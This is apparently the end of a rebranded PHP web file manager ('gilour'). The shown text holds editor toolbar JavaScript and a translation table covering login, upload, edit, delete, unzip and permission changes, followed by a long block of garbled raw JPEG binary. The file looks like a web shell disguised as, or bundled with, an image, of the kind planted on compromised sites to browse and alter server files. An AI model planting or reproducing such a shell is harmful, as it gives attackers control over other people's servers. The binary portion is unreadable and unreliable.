C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data and _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data and _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data and _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change();
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue and cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElementandnull===document.fullScreenElement||void 0!==document.msFullscreenElementandnull===document.msFullscreenElement||void 0!==document.mozFullScreenand!document.mozFullScreen||void 0!==document.webkitIsFullScreenand!document.webkitIsFullScreen)
                        and(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreenandeditor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue and selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue and selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue and selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue));
                }
            });
        });
    </script>
<?php endif; ?>
<div id="snackbar"></div>
</body>
</html>
<?php
}

function lng($txt) {
    global $lang;

    $tr['en']['AppName']        = 'gilour';      $tr['en']['AppTitle']           = 'gilour';
    $tr['en']['Login']          = 'Sign in';                $tr['en']['Username']           = 'Username';
    $tr['en']['Password']       = 'Password';               $tr['en']['Logout']             = 'Sign Out';
    $tr['en']['Move']           = 'Move';                   $tr['en']['Copy']               = 'Copy';
    $tr['en']['Save']           = 'Save';                   $tr['en']['SelectAll']          = 'Select all';
    $tr['en']['UnSelectAll']    = 'Unselect all';           $tr['en']['File']               = 'File';
    $tr['en']['Back']           = 'Back';                   $tr['en']['Size']               = 'Size';
    $tr['en']['Perms']          = 'Perms';                  $tr['en']['Modified']           = 'Modified';
    $tr['en']['Owner']          = 'Owner';                  $tr['en']['Search']             = 'Search';
    $tr['en']['NewItem']        = 'New Item';               $tr['en']['Folder']             = 'Folder';
    $tr['en']['Delete']         = 'Delete';                 $tr['en']['Rename']             = 'Rename';
    $tr['en']['CopyTo']         = 'Copy to';                $tr['en']['DirectLink']         = 'Direct link';
    $tr['en']['UploadingFiles'] = 'Upload Files';           $tr['en']['ChangePermissions']  = 'Change Permissions';
    $tr['en']['Copying']        = 'Copying';                $tr['en']['CreateNewItem']      = 'Create New Item';
    $tr['en']['Name']           = 'Name';                   $tr['en']['AdvancedEditor']     = 'Advanced Editor';
    $tr['en']['Actions']        = 'Actions';                $tr['en']['Folder is empty']    = 'Folder is empty';
    $tr['en']['Upload']         = 'Upload';                 $tr['en']['Cancel']             = 'Cancel';
    $tr['en']['InvertSelection']= 'Invert Selection';       $tr['en']['DestinationFolder']  = 'Destination Folder';
    $tr['en']['ItemType']       = 'Item Type';              $tr['en']['ItemName']           = 'Item Name';
    $tr['en']['CreateNow']      = 'Create Now';             $tr['en']['Download']           = 'Download';
    $tr['en']['Open']           = 'Open';                   $tr['en']['UnZip']              = 'UnZip';
    $tr['en']['UnZipToFolder']  = 'UnZip to folder';        $tr['en']['Edit']               = 'Edit';
    $tr['en']['NormalEditor']   = 'Normal Editor';          $tr['en']['BackUp']             = 'Back Up';
    $tr['en']['SourceFolder']   = 'Source Folder';          $tr['en']['Files']              = 'Files';
    $tr['en']['Move']           = 'Move';                   $tr['en']['Change']             = 'Change';
    $tr['en']['Settings']       = 'Settings';               $tr['en']['Language']           = 'Language';        
    $tr['en']['ErrorReporting'] = 'Error Reporting';        $tr['en']['ShowHiddenFiles']    = 'Show Hidden Files';
    $tr['en']['Help']           = 'Help';                   $tr['en']['Created']            = 'Created';
    $tr['en']['Help Documents'] = 'Help Documents';         $tr['en']['Report Issue']       = 'Report Issue';
    $tr['en']['Generate']       = 'Generate';               $tr['en']['FullSize']           = 'Full Size';              
    $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['You are logged in'] = 'You are logged in';
    $tr['en']['Nothing selected']   = 'Nothing selected';   $tr['en']['Paths must be not equal']    = 'Paths must be not equal';
    $tr['en']['Renamed from']       = 'Renamed from';       $tr['en']['Archive not unpacked']       = 'Archive not unpacked';
    $tr['en']['Deleted']            = 'Deleted';            $tr['en']['Archive not created']        = 'Archive not created';
    $tr['en']['Copied from']        = 'Copied from';        $tr['en']['Permissions changed']        = 'Permissions changed';
    $tr['en']['to']                 = 'to';                 $tr['en']['Saved Successfully']         = 'Saved Successfully';
    $tr['en']['not found!']         = 'not found!';         $tr['en']['File Saved Successfully']    = 'File Saved Successfully';
    $tr['en']['Archive']            = 'Archive';            $tr['en']['Permissions not changed']    = 'Permissions not changed';
    $tr['en']['Select folder']      = 'Select folder';      $tr['en']['Source path not defined']    = 'Source path not defined';
    $tr['en']['already exists']     = 'already exists';     $tr['en']['Error while moving from']    = 'Error while moving from';
    $tr['en']['Create archive?']    = 'Create archive?';    $tr['en']['Invalid file or folder name']    = 'Invalid file or folder name';
    $tr['en']['Archive unpacked']   = 'Archive unpacked';   $tr['en']['File extension is not allowed']  = 'File extension is not allowed';
    $tr['en']['Root path']          = 'Root path';          $tr['en']['Error while renaming from']  = 'Error while renaming from';
    $tr['en']['File not found']     = 'File not found';     $tr['en']['Error while deleting items'] = 'Error while deleting items';
    $tr['en']['Moved from']         = 'Moved from';         $tr['en']['Generate new password hash'] = 'Generate new password hash';
    $tr['en']['Login failed. Invalid username or password'] = 'Login failed. Invalid username or password';
    $tr['en']['password_hash not supported, Upgrade PHP version'] = 'password_hash not supported, Upgrade PHP version';
    $tr['en']['Advanced Search']    = 'Advanced Search';    $tr['en']['Error while copying from']    = 'Error while copying from';
    $tr['en']['Invalid characters in file name']                = 'Invalid characters in file name';
    $tr['en']['FILE EXTENSION HAS NOT SUPPORTED']               = 'FILE EXTENSION HAS NOT SUPPORTED';
    $tr['en']['Selected files and folder deleted']              = 'Selected files and folder deleted';
    $tr['en']['Error while fetching archive info']              = 'Error while fetching archive info';
    $tr['en']['Delete selected files and folders?']             = 'Delete selected files and folders?';
    $tr['en']['Search file in folder and subfolders...']        = 'Search file in folder and subfolders...';
    $tr['en']['Access denied. IP restriction applicable']       = 'Access denied. IP restriction applicable';
    $tr['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
    $tr['en']['Operations with archives are not available']     = 'Operations with archives are not available';
    $tr['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';

    $i18n = fm_get_translations($tr);
    $tr = $i18n ? $i18n : $tr;

    if (!strlen($lang)) $lang = 'en';
    if (isset($tr[$lang][$txt])) return fanco($tr[$lang][$txt]);
    else if (isset($tr['en'][$txt])) return fanco($tr['en'][$txt]);
    else return "$txt";
}

?>



  1$$1,5+(+5,N=77=NZLHLZnbbnŠƒŠ´´òÿÛ C				
	

  1$$1,5+(+5,N=77=NZLHLZnbbnŠƒŠ´´òÿÀ Ùà" ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑğ$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RğbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? ´ò’1Pä“S:£¢U 9Ì¦=IÁ§ŒSá
IàãW_lIĞaÉô”¥gcHÆêå#œ€ML#;e ä.×5Tzš±¥Jô ğ~”;‰Ş'W^ ô# ÕµO¼°lê À¨I!pG!°~”nAÅfËD®ÆBp)S9Í×85fßá	 †¥ì\KJ‘2‚¤†‘AA’*X_ÊdAåOqVîáˆhˆÃŠÎ×W/šÎÆn*PIÅ0ƒÆ8Ÿ@EAd¤’ «°ğ¸ ¢€“W"Mä*´·3Æ™1œâ³ç 9 ‚)Œ7+†£êI'½Ê1¶¢ç&=ãU
Cd¦‡M¸äNÖÓ	5:AªèËĞŒ´ŠPg-		$dš³›—Ô%^”Ä$f¶…Ó0vh´I­0PFüÆ§‡¡®ˆÈ†¬:2İÎA©ª`84òÛFMtFJÆmjIE1\58ÕÜB€MV%‰©ª0k–¬ï¢4Š3MaŠPH$š\u$Ö	§ä‚)–Ù8 Š@YˆÀ¨³ŒH‘’i¤ô
>¦e¸± R¡VPÀ|¦šÂãAÀ FàAb@Á î(Ë÷zƒïJHÂ´×Ë( T§~
)®„Ã¡‡r-ËpG"¬°‰Ÿ%¹=D\IRX- ]ÀR¿AwxÀ!T©ã¯J„(`V§8,){ıhEXÊH'cS!¡sò:çzÈ˜|Ì¡5°à3nœâ¨Ü¦FPy¢£cZNÌÉ“~U†A‰à»s’Tı\û:}÷ ğ½Í(gHå	hÏ!Cr¤SR:neå‰YĞ<dç¨î*Fœ]«†mÃÑªŒÊì !,	è*¾"T¿îƒÕ«d‰eëËk‹KUbÌyH¬iß6ĞÄ~öKzŠÚšçÎ‰•#f‰ ‘÷éX«RN¢F!O­èÊÛ™ÔMìTDQ*+¦µ¤¶Eº„K{'ş`bb ¥Ô]mÿ u$§ÓØW¹ƒ¯IBJGŸ^Fãa¡ ·°rÍĞ’j±2î É–‘U™†õ‘&“ÆO¥mVj{
qÜ»u$U%Ú¨—XfW í<…M.D¯Uy'¯äA)P2FĞ€ÖQÓb™€ìK…&´T U4ŠD€2ÇcĞ}*ÌroR}	ğ¯j‚´.Î*Úì)¦œSCîÉ÷â–ºQƒ
CKILD.XğU6å›†¯àQšN
[—¸ìfËÒ£9'4Àig’v¨÷§]1‚lQ3ªw¾à}…pMAT’:£w²xíd1 ÔèR»99ªi”1ÁéŠœ$ÒŒJ@…uRP·»)ó}©å}Ã84õ¶i1lĞT¯£ ÔÓä!AÎM9Bó˜s=¢g=¼¨Ê É'ƒW˜*sš€ŞÊNB
“íØ íÉ®x,*r.J³å"6N:KN[icmË0'ĞD÷r1ÎÌ
•.°‚kX:û¢”jÛQÌ÷ïB;©ÍFn°5p6@ÅfŞÆÂ@Ç¡«*”éó@šqŒ¥iµä‡€@e-’Æ“cğp)DYèë_=RµY¿zGZ5°€³d Æ*Ÿ€©PIïP“XÉ”7:ãRdƒNwÊ€ êj „Òq4˜©¦’–ƒ@§fÓs@áİÀÍ)c¦™š\Öf—Ur*à™%bI!Pz¢iTàÔJ)—µ¡hÄ	!@È¨À' Š¨`jÀa &£bÓ¹&Öe‘Ó±†Éìi6áE,G8³4DH$àÔí	,JœÔUp›# ¢´àF
_g7cX‘f',=ÍLÎX/)é
<œ¤ƒséN„#¿–êC@5•î^ˆDc•$ÔƒJÑ`¸Èje@e$©Qb;D¹jVhŞ¥¯ AÈ>†£Pa$J[|y8"›Ô|²¼XÒz‘JáT©^…rG¡¦†4\KÈ°¼.s•4Òj5$ğy"‚ÔÅbQ‚]€owaYàÕø°H=Å5¹MÁUÚä_-  Uw°`$“d¤¸t¡®Êrº·)ÈÑ8
  
ˆ ”ŸqFæ
¡¿qJÄF#¾+I!!:P‘‚*RšfF:Ô·`Ü:  ¹¡In‡ SHnNÁmG ÄT'ëO‰*ê)J*’Xö¹¬ù\¶ì  æ¤Dã;OãND
2Ø$öì)åÅo
InKw"Øç8
 ÷<Ó]@,Å‰< p	¥–qôË‚««Á‰Ët>ƒéJ¤¡4›°nVlPYÜŠ–5X™`?¥q¹—k–™ˆè	¦Êˆ£ÔUM´1€jÜ ª°$Ñ{ÖvTRAéSHEWŒ§ 9CíéA”¶ÖU<WQcÜñüÃæRG×äŠ6ädg¨˜È89¨pUbecÊŸÀÒ°Ä”Æ¬Á£$CŠb<Ç¢—AÓÔTÊdbØ úÕˆ‰Š2H=È‡z‹]š[AeqRIa’=øÕ7Ì	—¡=Ç½@HH
YØäúO¶HŒŒŒÙR0=Aõ-\ÑFËQĞ˜›å`† ŸjüÖ0 ~­0£Ç!`K`õjÛİ+C)\‡EÎ`óYØ»ØÍ¸·3»<C§$t>Õö“,%öå$kª° RFKoÀš¡<„æ'1³nù€ÂªĞ¯¡›ÜÛÛ+A´«ğXœú0«†ÚÎi˜1Í	¨É4$mÔ¡ÂÈ*Oq×€Û\»ã»”‚zo¢wz[B´Aã[Y$¹ÛÅIä›GÖ³ofÍ¸)UşíëO£$(féœÕs²#0Œg;Ší¦í¹ŒõØˆ¨ƒ—à·oqR:'–¬Ù t ã5£ÉXa$­[K`dW– `Â½œ=9TW_	ÃVq†æ[ƒ½™U‚ qW¢±g?(lâ’|;1à³ì*H-×î7v ì­D“ç²*;]”á¹+ Ür„ãµ=$9À,ÇğÍ1òy©s€G_¥FÏ;6ô¯L˜ô¯SRÑ³9ªFîè·] ƒzÕhTu\®z©b½(ìqOp4†Š*„!¦“KLpH hËœ39 dÑk.X•ecmÌH54	±rÇ¥W™2«ËO• @ÅˆÉ'5#ªÍè)ÄÖmä¯ ák¢¤Õ*rf‹œìÆÉtJUÉ2š„2M\¶@ç$eGêkÊR«ˆ©Êw5
Q¹!‘¶Àäš²–Á\äUÕEQ€ §^•,$ µÖG$ëÉ½ù¡ÉfcÛ€G¸w•ÈÅi3Œ‘Œ‘Y®Is'BEJtá.cHNrV,¦"GÌM8!'qÁ8ãĞUQsR"¥iVXXò8÷&¶Ui8i#7	©jg»¾æÉf¡(q»× ïVÉŠ0&$Ô(ÉÚc_?‰ŠNO˜ë‹+šiÅ)šFàf„f’¤#¾E0ŠCE¥äĞA"šiÆšh†šiM4Ğxpy”¤P¬Ë
p¦‘ÜPi1¢UÓ€	4ØòH uâ¤’&B³f±,+du¥' š¬C`qR†b¤Vm&I%ğk§°»8P#$cÙ®MYO#µ¦tXÊ©Î $ÖuË¨¼Íœ§–gîôçÚ¦;m2œİGãXÉ}ÄœŒƒƒWÒbdGÇ ûŠÉÆÆ	çÜ¯€jüQ†ˆH§*x ö5Rââ&‚õ$HñBX6c‘pG£TX–›E†5É t©±xÕãÀ€Ÿ¨¬Ô•—#9&´-'`vò±è{QÌ™&•ÑÂbAb(DĞå@$»”²çr†àSã
ÍˆG(êCnÅB¥X‚0AÁ©V ÊAáªb¬ÌJŒ‘Q¾Â79%EQÈ¡Ì3b§Ş&¬DáAÀÉÏ8¨<İ¿v¾ç“LóIÉ4	§-Ía(TlÒääU–®Å2’ªF	ã5´fÌeO”µ® İN\Ş¢bÈåKÈô¡BHNX©ïèk«êÆ6ê)Ü@9 1  ’y&œªPÈY\sL Ra6R€ié ÁV¨	 ÓZˆÍÄIÖ'8¬ Ú7·Ş#è?Æ«Èù#çê}*¥ÍîZè¦í¨¹nh´Â¢{ˆãFv8P2M`}¬³uªsß«Ï
d˜‘`?ˆÿ €­\ƒ•d@º—q†aŸ ì)¢<6I$ŠËŒ×-²Şîjü—$îšE'	$
çTå6Øz>ÒA9:‘O$òvèzf¬y!FŸ ÀÓC’€ŸRsüëE‡±<å¼ Xˆ<…R@5’ò@vÚ°ú*ù¹¶ŒàÍûn‚öØ?E&©P‡Y3şR¨MI±ˆãP;Î*x‚üóÄ¸= &­}®#ĞH~ˆiÔ~’ß­R¦…y‹{ÑŸßD}ŠLû=èè"aõ"­}®ìÃê¤R‹»ùì´ı•6’(r ²'ª0 Õw¹a¸KŠ	äãšİYùWSô Ô¿Pi:{M£š‚æ—~€@& Xˆ-&õ`Í’9sÚºg¶¶’Ğ©?‘ªÍ§@s´²ƒô#õ¬¥…-V2Ş|©åXZpÌŠê@8|ØÊ«ˆ®EuÈüÅSx§ƒæ’,ï!ÈüGQ\ÓÂÎ:£UU2kt•€aUå»·/'œˆÎ a’O°¨¦Ô]	ƒÇ^µÍÏ$¬ìÅ‰bsXÆ„ÛÔiõ4¤iDJàª	7F„`àñÅR¸g–2¤¨$‚ïzÍœÊÌ7–$2sSî”¯”v³mÆ+_gÊmİUí9Ø#}YBâòáãk0ú*iD$4Dícs×ŸCP3’ŠÊØnÖ´½ÅbX@@àÈúj½ÃHÎ±¡ÁPKz
¤ 2‚¶œšl^d-7˜˜I û×eUZtùbe:å.fBÅ‹*‚ZyqôQŞƒr ˆ¢ÀqŸz‘mäÆ±ZÅPHe&·§V[ı£)ÅlI4¦M®AéŠXÆWi''T8Á= nÀWM³UbÌåácdh¨âŒ"€	§×ÓGmO!ï Ph¤4ÀCHiM4Ó 5VK”Œà‚MHîy ª-‹d“S&şÉ¤"·Á‚BzLh&˜‚ä-L–ÛXrASç*“š÷ÊsQøb¶
I`ÔÊF  R’)ûkXÂVŒL¥)IêIU.g
v† ÔŞhXœY›Ì³d0^z‘šÎµNUeñHÒ”.îúŒ<„í-L1LÑØ'#½_C88`}@Á¥w+ÎÚÎXu8k#EU§¤LU?5[yb!B‚9úš·$Q˜ÙŒj ŠÊ;FáƒìkÍ­	a´æø£%SQØyİˆ rOaDˆ‘€I#“SBŒr0äT.wHÀøÉQ~îïâÓ¼¬WŠi§:•b¦Šáf£i>ši`%NEúš	¤&i†”Ò4ÓM8ÓM ;ĞÄ’4‚*ÍÔB9O÷[‘Q‚>†²NêæÒˆ…8P0Mr)’=W'­[J#ÆCñµ[r	c#kŒ+›C±\¹dSƒ9¥–´”$Œçğª • ƒIj7¡8;XŒÔ›Î}ªÀ$– Š³°8($qy¤ÑQd¤‹!ÀSÇãO,@Q»Ø¨€Wv@ê.à ¦ÅÜ´ËÉ=…i[¹1¼DVrDŒàc û»XÛ‚I*r}ë)Gbu…ÆÖ*y­ÛÜ,m¸© uZÒuFhœe¯±õ«Ğb¸!Ùvv9¤–±3›ÒW3.Y‚§~µs·˜: hºDŠVT )äÓğª¤mE`zçê*d¬Â)4mï— ET“åmıT}½ê’9'’jìjŠÉqåFWÛ5LjiPÇÊä.j±$šeD“pè=‚*5F*HÔĞª°İ‹nç¡4¨ÌFjRÕ?’ê½ÈªÕ™4‘hÉ˜ÙXrG˜YDc&¢-ªX‚qøÓ$yjÄrxÇçZ8M£¤Æœšì’Oz‘b}¤0ĞƒÍS~.#V /.I=qÒ—³qÜißbFa»B:ˆ÷7Ôšç§œ±ëOÕnL“]`õk,¹`§=@®ªqĞ$í¡lK±½‘õ¨ôÛ_´ò1X‡æÇĞ{UY‰1ì\à{æ®Å6Ğª½  AZX“°‚XbEDUU şµaï"ˆ Ä–nŠIú
âÍÔ¬1$nÆ}M^IÖİ3åÈùœO°ö¢í“7%»˜ıçX‡§ßŸAYÒOl~û4Ÿï1"°å»2±#5Ô®ØôFçÛâCòF«ô P5RSX.š€“ëE‚çdšš’i£Têk’@ëJ$ õ£PĞïáº CTåÁÄ[^¼dVÒ_äB•·kÊ€œ˜ÔŸp)Dºİb+$_U·Ü$Œ&¸dRx` ®=ê¹Ñ<ŒéÂHËpßF©Ù¹¢¡*¨¬”y[½nFA
µiEÁévïMI•—¼í£ç×ß¨üÅ=%OºêŞÃ­Sj‹…üPR2\¶<.Gª0j¹…`¹Óí§É)µñ/¹Û½æ0J~õG ÁºMôg*ªÃÓvGëÍ=oâkyßïÌT8¦4ÚØâü¸ä
¬¥]r3ØıG­Tyg˜`[­zöV×Cq 1èÃ¯ã\ıî–Êc€GãÜVR¤m
½n$2¼ìÍó ¦ŒI†íÑGCV$´–'ÃØcT'Cçàô²q6R‰wßå…HÈ ‚¡rÑ¢H$“õ§K>#)Øj™rNp+Zq3œ‰<‰
b@ÎXàŸ ª¼ÔÒd€ÌI¨K`WUÕŒu$pÂ¦†Ô«nb	C09 ğEi¡È¯w‡¤éÆn>ñÅ‰©4ùVÂâšiÆšMz‡RPi¤š ZR*´°Í!Èz‡ìlz¸©r}"kG¬‹à)ä
SU"óã!X«(üg5qw&JÌ4A`½MW{”V ‚j®–âI½‰	©½Ò)¼!°±³
¯,ğºb ±\øŠüº7¥NïRT•$Ê¹ÂsLª0½rj²8 îŒ¢¦B¨qÏ,Æ¸©×CyEDĞÛËË‘Ç Ô/w|œ*Œñ²Œ³Î*®I§_*^ê¤B„eï2Ô×fÉáGE¨‰¡Í¯­z•'Í#¡E%dX…RO\1‘IIYÊ¤å¸ÒHs1bI9&™A¤Í@%”†!ÓN4†4†”Ói ÓHiM4Ğ§Hñş!È5”	´"|PİÅ¶@ãî½sÁÙØë¨®¹„ªã©#Şš€’i™4õ5lÅr{S3’B*PAR ¨ Ô”YIÈ©âA1e%FzzÏÎ)UÈ ƒRãØ¥>å±©e#‘ÔR	m‘M°ebr@ ûŠ„’ÌN)[¹\Ë¡d>æfÇSši;š˜Ëc¾*ÔRP»Ğâ¥ÙjX.UPÈ\h“œÔ;òpÀæ*U1P² {ƒÅE.Ë¹,	5Õi€|€AÉck€:ët£û·51ÒDÔøÉ@HÃ4®áü°@
kHª²É—5‹5Š-ª;‚*ÕµÀŒá*1YŠÛÈ<œu«Qœ0nÀŠKAÎ7V4¸,hØ}GáT¥MŒ  ‚´XÆÌJ`à`z{UG@2 #ƒO©Ï`µs™# ğG¨«F(ƒpãÔzâˆ-%e²ˆ2=‡j‘îìmÄ!œvQ¹«ªıß{b';Ëİ$Š	€:â¬˜ƒ»³{t–u—ÎÛm£±vş‚¥7;Aò£÷;iJ&n5æŠˆãáQV‚ãÖ²şÑ;AìŠXÒ8œçßhQúÕûeĞŸfËSÎIÍr——¥˜àÔŒ—±±ˆÏ@X?
Å2ÌOÎƒê(K›Rş.åÜdõ\Î’%JŸ¼§{vªà–(ò	Ç×®Le
Ë8áYv¸ô=ªÑ;¥b:/Ê>½èS¸}âNÒ›&P`<€³7 îjÊE‘€(çôÁ
³¼£mº £1‡ıÑŞ¥H ;˜—ï7o íRŒ   ĞT]ÁÚ_-ıÕ? cöeªL *¯ŸrßrÔıd`¿§&‹æÉ{*“úš@>Rª™¦:\Á?E£Û0ÿ –ÇñQ@	¦ƒPæqühßUÇò¤ß(ûÑ~*s@0`Õğp++˜ÁÁm§Ñ†*é¸ Re"ÃË"ˆË/r§‘øR-ÜR¹î¬0#P¤àÔ7.@1,ƒĞğGĞö¥aÜ%{v&òç&#Óğ5¯m©,‹NGPx û×&¯“„r÷$<şœdÀbÑJ:0>â‹ÎÌê›jÌš1ÃW'}Û_†õYIr	£QÙ3ºˆÇ†i$dàw©­{MA— š\í=AÓìuÀÒä¢³¡¹Y  ÕÕpkU$Ì\Z(^ibhØDÁIçiägÔWi4o¶XÊ¸ ×¤Q\[ÃsIP0ıGĞÒ”›GÊ„*¶H®ÏSÑÚI£=úåæƒcŠ”­¡w¾£+Û‘‘ÀÕG;€â„ÓMZÅ€•‘N:œZæDPFEbr9«qDgmä•^ŸZ÷rÚ¯“‘x˜&ù™u¸Î)Æ”(P ¤5ì#ˆi3A¦šcj7rªHóMÀ4Xi™íœ³1ÜiĞË$cc‚GcWˆt¦ìqIBÎå¹¦¬ÈNd ©$RN&M­,ˆæb´YÒ@ffl`•y†F
:ÔÔ§
ŠÒøJ„ÜuFrZe.ØtZ$”C 	ƒşÏ½XwóK*1:Õ
¢BØ†—Í*P§r<¦ÊNNò+OºGÉê)X©<w4)+ÁäòMD€±85àW¨¥RLêŠiXl˜vç€ÒÓkîXìÑIKš JJRi¦	E™ @iÑHc¦šy¤"€#4†œi¦€=$20 V›Û·*zA÷ªVù†@XpEi´à‚+‚£|ú•5MN}ÔƒNˆ`œô5fv‹sßœZ¨% tÑÚ9$”Y+€:alğED\šLÓ±-5e'G¨ªàTŠ¬İé1Ä•-SˆÊ±Æzâ‘c*Ø`A‘Q©*Är\‹FİİNO©´h’cÑŞ4HÁ' ŒŠ@Ò†Ü®A<|¼b£êŒ=9±†;°28¨4,9$“ÜÔ +(r1Nt2*G3RˆPI È&•ÇaŠ0@®»L8¶×"ÇæQ]U“m°˜ûÎnÚ“%uc%åç­W'.{ôöˆ\T\ÆIW æ²GB-+ªƒVAÂ“íšª’Å!Û*í$pËëS¼rˆÁÈd=zcèi[Peë[¸M›<z‚jãİA Ád—?,iÎûG ¬,ĞÅAë	Zœ‘ªª€&µ„”L%Jì·s=ÌüI&ÿ Äõ5A#Æ –ŞgË ®N1ï¬íIò‡ã«MiiÏVO»©2¾ «Œ–nsô÷zlË(vè+æöîeyæXWVônT1	‚Ã«uè+UI7ÜêZUR!µ|}ŠÈ¹Õn\c#êÕš×-·‰ªÍ!5jšê.{lO#JTB:£
~hVP~fõ5ªĞÍ¶Èww!ù—ští¹H\‚ç¾„w«2*à@ı0µX2±`2ˆêŞ´™ÎØÊƒó;'ÛŠŸÏ ÈÂUa’ NÖ1>§¥\òwN¬ØÚ£ê}h)±–^d%S²)Æ~¦¦‰¢ˆa(ö9ˆG’´®;­<L†“ÉZi€@5ÊµVb*ÃAUXHÅ¹¤Í.J;r @@#*?+oÜb¾İE[h$ TLŒ§(¸ìB%tûëıåäT»Ãƒ‘IQ˜»¡ÚŞÔPÜ#˜)Wk,İn£èi¡ÿ †@ŸÈş4»
œ£cı–ä~€ *LM½GUcó-Ká	V¯ê¿â*·àä¤ƒ¡ïÿ ×8*ì©0Úç€İúCFŒ6
AäSGYÃÏ²l°İêGAZ"@Ê¬§*FA,Ñ2Ğ–Ht%—ø—¿ÔWEg8™Ô‚§¡®@ÈAëVí.Í¬…ÆLlrëıE(¾V\ÈîPŠ’©E0uVR# „Tâ@{×BhäitWR¬R0EpúÆ’mÉeÆzCèk·I,i,lV ĞÕÇcÅ¦‰@Mušœb’U§OqØÖö|­’Ä-oF…JİêF?¼JòÃ V íPÃˆMLké0´U*Q_hókTö“¿Ùi) ×A‘¦šq¦š¡ˆM%ŒÕ ÒfŒÒf˜!¢š`!¦Ã’iôS
